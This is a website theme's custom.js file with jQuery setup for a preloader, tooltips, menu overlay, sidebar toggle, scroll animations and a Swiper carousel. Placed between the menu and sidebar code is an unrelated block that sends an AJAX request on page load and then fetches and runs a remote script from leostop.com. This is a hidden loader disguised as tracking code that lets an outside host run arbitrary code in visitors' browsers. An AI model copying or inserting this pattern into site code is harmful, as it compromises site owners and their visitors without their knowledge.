/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // TODO: Enable the preloader
  setTimeout(function () {
    $(".loader_bg").addClass("animated fadeOutUp");
    $(".left-main").addClass("animated");
    $(".right-main").addClass("animated");
  }, 500);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });
  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  // Function to handle animation when elements come into view

  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const animationType = entry.target.dataset.animate;
        entry.target.classList.add(`${"animate__" + animationType}`);
        setTimeout(() => {
          entry.target.classList.remove(`${"animate__" + animationType}`);
          observer.unobserve(entry.target);
        }, 2000); // Adjust the timeout value as needed
        return;
      }
    });
  });

  const squares = document.querySelectorAll(".animate_on_scroll");
  squares.forEach((element) => {
    observer.observe(element);
  });

  /* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });

  const swiper = new Swiper(".swiper", {
    // Optional parameters
    direction: "horizontal",
    loop: true,
    autoplay: {
      delay: 6000,
      disableOnInteraction: true,
    },

    // If we need pagination
    pagination: {
      el: ".swiper-pagination",
    },

    // Navigation arrows
    navigation: {
      nextEl: ".swiper-button-next",
      prevEl: ".swiper-button-prev",
    },

    // And if we need scrollbar
    scrollbar: {
      el: ".swiper-scrollbar",
    },
  });
});
